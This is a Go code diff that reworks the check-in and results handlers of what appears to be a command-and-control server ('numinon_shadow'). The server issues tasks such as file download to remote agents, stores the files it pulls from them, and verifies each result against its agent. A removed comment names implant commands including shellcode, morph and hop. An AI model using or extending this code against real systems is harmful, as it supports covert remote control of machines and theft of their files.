@@ -5,104 +5,171 @@ import (
 	"fmt"
 	"io"
 	"log"
-	"math/rand"
 	"net/http"
 	"numinon_shadow/internal/models"
-	"time"
+	"numinon_shadow/internal/taskmanager"
+	"path/filepath"
 )
 
-// CheckinHandler processes requests from clients checking in for tasks.
+// CheckinHandler processes requests from clients checking in for tasks
 func CheckinHandler(w http.ResponseWriter, r *http.Request) {
 
-	agentID := r.Header.Get("Agent-ID") // Read the custom header
+	agentID := r.Header.Get("Agent-ID")
 	log.Printf("|✅ CHK_IN| Received check-in %s from Agent ID: %s via %s", r.Method, agentID, r.RemoteAddr)
 
 	var response models.ServerTaskResponse
 
-	// A task is available, so populate the details.
+	// TEMPORARY: For testing, always create a task
+	// Later this will be driven by your UI/API
 	response.TaskAvailable = true
-	response.TaskID = generateTaskID()
 
-	// Randomly select a command (this is just a temp way to test before integrating client that will issue commands intentionally)
-	commands := []string{"download"}
-	response.Command = commands[0]
+	// Create command arguments (using your existing function)
+	command := "download" // Hardcoded for now
+	var commandArgs json.RawMessage
 
-	//commands := []string{"runcmd", "upload", "download", "enumerate", "shellcode", "morph", "hop", "doesnotexist"}
-	//response.Command = commands[seededRand.Intn(len(commands))]
+	switch command {
+	case "download":
+		commandArgs = returnDownloadStruct(w)
+	case "upload":
+		commandArgs = returnUploadStruct(w)
+	default:
+		// For commands without special args
+		commandArgs = json.RawMessage("{}")
+	}
 
-	response.Data = returnDownloadStruct(w)
-
-	log.Printf("|📌 TASK ISSUED| -> Sent command '%s' with TaskID '%s' to Agent %s\n", response.Command, response.TaskID, agentID)
-
-	// Set the content type header to indicate a JSON response.
-	w.Header().Set("Content-Type", "application/json")
-
-	// Marshal the response struct into JSON.
-	jsonResponse, err := json.Marshal(response)
+	// Create task in task manager
+	task, err := TaskManager.CreateTask(agentID, command, commandArgs)
 	if err != nil {
-		// If marshaling fails, log the error and send a server error response.
-		http.Error(w, "Error creating response", http.StatusInternalServerError)
+		log.Printf("|❗ERR TASK| Failed to create task: %v", err)
+		http.Error(w, "Failed to create task", http.StatusInternalServerError)
 		return
 	}
 
-	// Write the JSON response to the client.
-	w.WriteHeader(http.StatusOK)
-	w.Write(jsonResponse)
+	// Add server-side metadata for download command
+	if command == "download" {
+		// Store where the server should save the downloaded file
+		saveDir := fmt.Sprintf("/var/numinon/downloads/%s", agentID)
+		task.Metadata["server_save_path"] = filepath.Join(saveDir, fmt.Sprintf("file_%s", task.ID))
+
+		// Update task with metadata
+		if err := TaskManager.UpdateTask(task); err != nil {
+			log.Printf("|❗WARN TASK| Failed to update task metadata: %v", err)
+		}
+	}
+
+	// Populate response with task details
+	response.TaskID = task.ID
+	response.Command = task.Command
+	response.Data = task.Arguments
+
+	// Mark task as dispatched
+	if err := TaskManager.MarkDispatched(task.ID); err != nil {
+		log.Printf("|❗WARN TASK| Failed to mark task as dispatched: %v", err)
+		// Continue anyway - task was created and sent
+	}
+
+	log.Printf("|📌 TASK ISSUED| -> Sent command '%s' with TaskID '%s' to Agent %s",
+		response.Command, response.TaskID, agentID)
+
+	// Send response
+	w.Header().Set("Content-Type", "application/json")
+	if err := json.NewEncoder(w).Encode(response); err != nil {
+		log.Printf("|❗ERR RESPONSE| Failed to encode response: %v", err)
+		http.Error(w, "Error creating response", http.StatusInternalServerError)
+		return
+	}
 }
 
+// ResultsHandler processes task results from agents
 func ResultsHandler(w http.ResponseWriter, r *http.Request) {
-
 	agentID := r.Header.Get("Agent-ID")
-	log.Printf("|✅ CHK_IN| Received results POST from Agent ID: %s via %s", agentID, r.RemoteAddr)
+	log.Printf("|✅ RESULT| Received results POST from Agent ID: %s via %s", agentID, r.RemoteAddr)
 
-	// Read the raw body from the request
+	// Read the raw body
 	body, err := io.ReadAll(r.Body)
 	if err != nil {
-		log.Printf("|❗ERR RESULT|-> Error reading result body from agent %s: %v\n", agentID, err)
+		log.Printf("|❗ERR RESULT| Error reading result body from agent %s: %v", agentID, err)
+		http.Error(w, "Failed to read request body", http.StatusBadRequest)
 		return
 	}
 	defer r.Body.Close()
 
-	// --- PRETTY PRINT LOGIC STARTS HERE ---
-
-	// 1. Unmarshal the raw JSON into our AgentTaskResult struct
+	// Parse the result
 	var result models.AgentTaskResult
 	if err := json.Unmarshal(body, &result); err != nil {
-		log.Printf("|❗ERR RESULT|-> Error unmarshaling result JSON from agent %s: %v\n", agentID, err)
+		log.Printf("|❗ERR RESULT| Error unmarshaling result JSON from agent %s: %v", agentID, err)
+		http.Error(w, "Invalid result format", http.StatusBadRequest)
 		return
 	}
 
-	// Create a temporary struct for logging so we can display output as a string
-	prettyResult := struct {
-		TaskID string `json:"task_id"`
-		Status string `json:"status"`
-		Output any    `json:"output"` // Changed to string for display
-		Error  string `json:"error"`
-	}{
-		TaskID: result.TaskID,
-		Status: result.Status,
-		Output: result.Output, // Convert byte slice to string here
-		Error:  result.Error,
-	}
-
-	// 2. Re-marshal the struct into a "pretty" indented JSON string
-	prettyJSON, err := json.MarshalIndent(prettyResult, "", "  ") // Using two spaces for indentation
+	// Look up the task
+	task, err := TaskManager.GetTask(result.TaskID)
 	if err != nil {
-		log.Printf("|❗ERR RESULT|-> Error re-marshaling for pretty printing: %v\n", err)
+		log.Printf("|❗ERR RESULT| Task not found: %s from agent %s", result.TaskID, agentID)
+		http.Error(w, "Task not found", http.StatusNotFound)
+		return
 	}
-	log.Printf("|✅ RESULT| Received results POST from Agent ID: %s via %s\n--- Task Result ---\n%s\n-------------------\n", agentID, r.RemoteAddr, string(prettyJSON))
 
-	// --- PRETTY PRINT LOGIC ENDS HERE ---
+	// Verify this result is from the expected agent
+	if task.AgentID != agentID {
+		log.Printf("|⚠️ SECURITY| Task %s result received from wrong agent. Expected: %s, Got: %s",
+			result.TaskID, task.AgentID, agentID)
+		http.Error(w, "Unauthorized", http.StatusUnauthorized)
+		return
+	}
 
-	// Respond to the agent to confirm receipt
+	// Store the raw result
+	if err := TaskManager.StoreResult(task.ID, body); err != nil {
+		log.Printf("|❗ERR RESULT| Failed to store result for task %s: %v", task.ID, err)
+		http.Error(w, "Failed to process result", http.StatusInternalServerError)
+		return
+	}
+
+	// Process command-specific logic
+	if ResultProcessors != nil {
+		if err := ResultProcessors.Process(task); err != nil {
+			log.Printf("|❗ERR PROCESS| Command-specific processing failed for task %s: %v",
+				task.ID, err)
+			// Mark task as failed but still return success to agent
+			TaskManager.MarkFailed(task.ID, err.Error())
+		}
+	}
+
+	// Pretty print for debugging
+	prettyPrintResult(result, agentID)
+
+	// Respond to agent
 	w.WriteHeader(http.StatusOK)
 	w.Write([]byte("Result received"))
 }
 
-// seededRand is a random number generator seeded at application start.
-var seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
+// prettyPrintResult logs the result in a readable format
+func prettyPrintResult(result models.AgentTaskResult, agentID string) {
+	prettyResult := struct {
+		TaskID string `json:"task_id"`
+		Status string `json:"status"`
+		Output any    `json:"output"`
+		Error  string `json:"error"`
+	}{
+		TaskID: result.TaskID,
+		Status: result.Status,
+		Output: result.Output,
+		Error:  result.Error,
+	}
 
-// generateTaskID creates a random task identifier.
-func generateTaskID() string {
-	return fmt.Sprintf("task_%06d", seededRand.Intn(1000000))
+	if prettyJSON, err := json.MarshalIndent(prettyResult, "", "  "); err == nil {
+		log.Printf("|✅ RESULT| Task completed by Agent %s\n--- Task Result ---\n%s\n-------------------",
+			agentID, string(prettyJSON))
+	}
+}
+
+// TaskStatsHandler provides task statistics (useful for debugging)
+func TaskStatsHandler(w http.ResponseWriter, r *http.Request) {
+	if store, ok := TaskManager.(*taskmanager.MemoryTaskStore); ok {
+		stats := store.Stats()
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(stats)
+	} else {
+		http.Error(w, "Stats not available", http.StatusNotImplemented)
+	}
 }
